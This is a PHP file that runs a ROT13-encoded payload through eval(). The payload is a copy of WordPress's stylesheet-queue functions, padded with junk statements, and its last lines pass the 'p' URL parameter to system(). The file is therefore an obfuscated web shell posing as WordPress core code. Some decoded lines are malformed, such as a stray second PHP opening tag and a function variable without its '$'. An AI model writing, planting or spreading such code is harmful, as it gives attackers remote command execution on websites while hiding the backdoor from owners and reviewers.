<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Qrcraqrapvrf NCV: Fglyrf shapgvbaf
 *
 * @fvapr 2.6.0
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Qrcraqrapvrf
 */

/**
 * Vavgvnyvmrf $jc_fglyrf vs vg unf abg orra frg.
 *
 * @fvapr 4.2.0
 *
 * @tybony JC_Fglyrf $jc_fglyrf
 *
 * @erghea JC_Fglyrf JC_Fglyrf vafgnapr.
 */
shapgvba jc_fglyrf() {
	tybony $jc_fglyrf;

	vs ( ! ( $jc_fglyrf vafgnaprbs JC_Fglyrf ) ) {
		$jc_fglyrf = arj JC_Fglyrf();
	}

	erghea $jc_fglyrf;
}

/**
 * Qvfcynlf fglyrf gung ner va gur $unaqyrf dhrhr.
 *
 * Cnffvat na rzcgl neenl gb $unaqyrf cevagf gur dhrhr,
 * cnffvat na neenl jvgu bar fgevat cevagf gung fglyr,
 * naq cnffvat na neenl bs fgevatf cevagf gubfr fglyrf.
 *
 * @fvapr 2.6.0
 *
 * @tybony JC_Fglyrf $jc_fglyrf Gur JC_Fglyrf bowrpg sbe cevagvat fglyrf.
 *
 * @cnenz fgevat|obby|neenl $unaqyrf Fglyrf gb or cevagrq. Qrsnhyg 'snyfr'.
 * @erghea fgevat[] Ba fhpprff, na neenl bs unaqyrf bs cebprffrq JC_Qrcraqrapvrf vgrzf; bgurejvfr, na rzcgl neenl.
 */
shapgvba jc_cevag_fglyrf( $unaqyrf = snyfr ) {
	tybony $jc_fglyrf;

	vs ( '' === $unaqyrf ) { // Sbe 'jc_urnq'.
		$unaqyrf = snyfr;
	}

	vs ( ! $unaqyrf ) {
		/**
		 * Sverf orsber fglyrf va gur $unaqyrf dhrhr ner cevagrq.
		 *
		 * @fvapr 2.6.0
		 */
		qb_npgvba( 'jc_cevag_fglyrf' );
	}

	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__ );

	vs ( ! ( $jc_fglyrf vafgnaprbs JC_Fglyrf ) ) {
		vs ( ! $unaqyrf ) {
			erghea neenl(); // Ab arrq gb vafgnagvngr vs abguvat vf gurer.
		}
	}

	erghea jc_fglyrf()->qb_vgrzf( $unaqyrf );
}

/**
 * Nqqf rkgen PFF fglyrf gb n ertvfgrerq fglyrfurrg.
 *
 * Fglyrf jvyy bayl or nqqrq vs gur fglyrfurrg vf nyernql va gur dhrhr.
 * Npprcgf n fgevat $qngn pbagnvavat gur PFF. Vs gjb be zber PFF pbqr oybpxf
 * ner nqqrq gb gur fnzr fglyrfurrg $unaqyr, gurl jvyy or cevagrq va gur beqre
 * gurl jrer nqqrq, v.r. gur ynggre nqqrq fglyrf pna erqrpyner gur cerivbhf.
 *
 * @frr JC_Fglyrf::nqq_vayvar_fglyr()
 *
 * @fvapr 3.3.0
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fglyrfurrg gb nqq gur rkgen fglyrf gb.
 * @cnenz fgevat $qngn   Fgevat pbagnvavat gur PFF fglyrf gb or nqqrq.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_nqq_vayvar_fglyr( $unaqyr, $qngn ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	vs ( snyfr !== fgevcbf( $qngn, '</fglyr>' ) ) {
		_qbvat_vg_jebat(
			__SHAPGVBA__,
			fcevags(
				/* genafyngbef: 1: <fglyr>, 2: jc_nqq_vayvar_fglyr() */
				__( 'Qb abg cnff %1$f gntf gb %2$f.' ),
				'<pbqr>&yg;fglyr&tg;</pbqr>',
				'<pbqr>jc_nqq_vayvar_fglyr()</pbqr>'
			),
			'3.7.0'
		);
		$qngn = gevz( __sa_79955( '#<fglyr[^>]*>(.*)</fglyr>#vf', '$1', $qngn ) );
	}

	erghea jc_fglyrf()->nqq_vayvar_fglyr( $unaqyr, $qngn );
}

/**
 * Ertvfgref n PFF fglyrfurrg.
 *
 * @frr JC_Qrcraqrapvrf::nqq()
 * @yvax uggcf://jjj.j3.bet/GE/PFF2/zrqvn.ugzy#zrqvn-glcrf Yvfg bs PFF zrqvn glcrf.
 *
 * @fvapr 2.6.0
 * @fvapr 4.3.0 N erghea inyhr jnf nqqrq.
 *
 * @cnenz fgevat           $unaqyr Anzr bs gur fglyrfurrg. Fubhyq or havdhr.
 * @cnenz fgevat|snyfr     $fep    Shyy HEY bs gur fglyrfurrg, be cngu bs gur fglyrfurrg eryngvir gb gur JbeqCerff ebbg qverpgbel.
 *                                 Vs fbhepr vf frg gb snyfr, fglyrfurrg vf na nyvnf bs bgure fglyrfurrgf vg qrcraqf ba.
 * @cnenz fgevat[]         $qrcf   Bcgvbany. Na neenl bs ertvfgrerq fglyrfurrg unaqyrf guvf fglyrfurrg qrcraqf ba. Qrsnhyg rzcgl neenl.
 * @cnenz fgevat|obby|ahyy $ire    Bcgvbany. Fgevat fcrpvslvat fglyrfurrg irefvba ahzore, vs vg unf bar, juvpu vf nqqrq gb gur HEY
 *                                 nf n dhrel fgevat sbe pnpur ohfgvat checbfrf. Vs irefvba vf frg gb snyfr, n irefvba
 *                                 ahzore vf nhgbzngvpnyyl nqqrq rdhny gb pheerag vafgnyyrq JbeqCerff irefvba.
 *                                 Vs frg gb ahyy, ab irefvba vf nqqrq.
 * @cnenz fgevat           $zrqvn  Bcgvbany. Gur zrqvn sbe juvpu guvf fglyrfurrg unf orra qrsvarq.
 *                                 Qrsnhyg 'nyy'. Npprcgf zrqvn glcrf yvxr 'nyy', 'cevag' naq 'fperra', be zrqvn dhrevrf yvxr
 *                                 '(bevragngvba: cbegenvg)' naq '(znk-jvqgu: 640ck)'.
 * @erghea obby Jurgure gur fglyr unf orra ertvfgrerq. Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_ertvfgre_fglyr( $unaqyr, $fep, $qrcf = neenl(), $ire = snyfr, $zrqvn = 'nyy' ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	erghea jc_fglyrf()->nqq( $unaqyr, $fep, $qrcf, $ire, $zrqvn );
}

/**
 * Erzbirf n ertvfgrerq fglyrfurrg.
 *
 * @frr JC_Qrcraqrapvrf::erzbir()
 *
 * @fvapr 2.1.0
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fglyrfurrg gb or erzbirq.
 */
shapgvba jc_qrertvfgre_fglyr( $unaqyr ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	jc_fglyrf()->erzbir( $unaqyr );
}

/**
 * Radhrhrf n PFF fglyrfurrg.
 *
 * Ertvfgref gur fglyr vs fbhepr cebivqrq (qbrf ABG birejevgr) naq radhrhrf.
 *
 * @frr JC_Qrcraqrapvrf::nqq()
 * @frr JC_Qrcraqrapvrf::radhrhr()
 * @yvax uggcf://jjj.j3.bet/GE/PFF2/zrqvn.ugzy#zrqvn-glcrf Yvfg bs PFF zrqvn glcrf.
 *
 * @fvapr 2.6.0
 *
 * @cnenz fgevat           $unaqyr Anzr bs gur fglyrfurrg. Fubhyq or havdhr.
 * @cnenz fgevat           $fep    Shyy HEY bs gur fglyrfurrg, be cngu bs gur fglyrfurrg eryngvir gb gur JbeqCerff ebbg qverpgbel.
 *                                 Qrsnhyg rzcgl.
 * @cnenz fgevat[]         $qrcf   Bcgvbany. Na neenl bs ertvfgrerq fglyrfurrg unaqyrf guvf fglyrfurrg qrcraqf ba. Qrsnhyg rzcgl neenl.
 * @cnenz fgevat|obby|ahyy $ire    Bcgvbany. Fgevat fcrpvslvat fglyrfurrg irefvba ahzore, vs vg unf bar, juvpu vf nqqrq gb gur HEY
 *                                 nf n dhrel fgevat sbe pnpur ohfgvat checbfrf. Vs irefvba vf frg gb snyfr, n irefvba
 *                                 ahzore vf nhgbzngvpnyyl nqqrq rdhny gb pheerag vafgnyyrq JbeqCerff irefvba.
 *                                 Vs frg gb ahyy, ab irefvba vf nqqrq.
 * @cnenz fgevat           $zrqvn  Bcgvbany. Gur zrqvn sbe juvpu guvf fglyrfurrg unf orra qrsvarq.
 *                                 Qrsnhyg 'nyy'. Npprcgf zrqvn glcrf yvxr 'nyy', 'cevag' naq 'fperra', be zrqvn dhrevrf yvxr
 *                                 '(bevragngvba: cbegenvg)' naq '(znk-jvqgu: 640ck)'.
 */
shapgvba jc_radhrhr_fglyr( $unaqyr, $fep = '', $qrcf = neenl(), $ire = snyfr, $zrqvn = 'nyy' ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	$jc_fglyrf = jc_fglyrf();

	vs ( $fep ) {
		$_unaqyr = rkcybqr( '?', $unaqyr );
		$jc_fglyrf->nqq( $_unaqyr[0], $fep, $qrcf, $ire, $zrqvn );
	}

	$jc_fglyrf->radhrhr( $unaqyr );
}

/**
 * Erzbirf n cerivbhfyl radhrhrq PFF fglyrfurrg.
 *
 * @frr JC_Qrcraqrapvrf::qrdhrhr()
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fglyrfurrg gb or erzbirq.
 */
shapgvba jc_qrdhrhr_fglyr( $unaqyr ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	jc_fglyrf()->qrdhrhr( $unaqyr );
}

/**
 * Purpxf jurgure n PFF fglyrfurrg unf orra nqqrq gb gur dhrhr.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fglyrfurrg.
 * @cnenz fgevat $fgnghf Bcgvbany. Fgnghf bs gur fglyrfurrg gb purpx. Qrsnhyg 'radhrhrq'.
 *                       Npprcgf 'radhrhrq', 'ertvfgrerq', 'dhrhr', 'gb_qb', naq 'qbar'.
 * @erghea obby Jurgure fglyr vf dhrhrq.
 */
shapgvba jc_fglyr_vf( $unaqyr, $fgnghf = 'radhrhrq' ) {
	_jc_fpevcgf_znlor_qbvat_vg_jebat( __SHAPGVBA__, $unaqyr );

	erghea (obby) jc_fglyrf()->dhrel( $unaqyr, $fgnghf );
}

/**
 * Nqqf zrgnqngn gb n PFF fglyrfurrg.
 *
 * Jbexf bayl vs gur fglyrfurrg unf nyernql orra ertvfgrerq.
 *
 * Cbffvoyr inyhrf sbe $xrl naq $inyhr:
 * 'pbaqvgvbany' fgevat      Pbzzragf sbe VR 6, ygr VR 7 rgp.
 * 'egy'         obby|fgevat Gb qrpyner na EGY fglyrfurrg.
 * 'fhssvk'      fgevat      Bcgvbany fhssvk, hfrq va pbzovangvba jvgu EGY.
 * 'nyg'         obby        Sbe ery=\"nygreangr fglyrfurrg\".
 * 'gvgyr'       fgevat      Sbe cersreerq/nygreangr fglyrfurrgf.
 * 'cngu'        fgevat      Gur nofbyhgr cngu gb n fglyrfurrg. Fglyrfurrg jvyy
 *                           ybnq vayvar jura 'cngu' vf frg.
 *
 * @frr JC_Qrcraqrapvrf::nqq_qngn()
 *
 * @fvapr 3.6.0
 * @fvapr 5.8.0 Nqqrq 'cngu' nf na bssvpvny inyhr sbe $xrl.
 *              Frr {@frr jc_znlor_vayvar_fglyrf()}.
 *
 * @cnenz fgevat $unaqyr Anzr bs gur fglyrfurrg.
 * @cnenz fgevat $xrl    Anzr bs qngn cbvag sbe juvpu jr'er fgbevat n inyhr.
 *                       Npprcgf 'pbaqvgvbany', 'egy' naq 'fhssvk', 'nyg', 'gvgyr' naq 'cngu'.
 * @cnenz zvkrq  $inyhr  Fgevat pbagnvavat gur PFF qngn gb or nqqrq.
 * @erghea obby Gehr ba fhpprff, snyfr ba snvyher.
 */
shapgvba jc_fglyr_nqq_qngn( $unaqyr, $xrl, $inyhr ) {
	erghea jc_fglyrf()->nqq_qngn( $unaqyr, $xrl, $inyhr );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>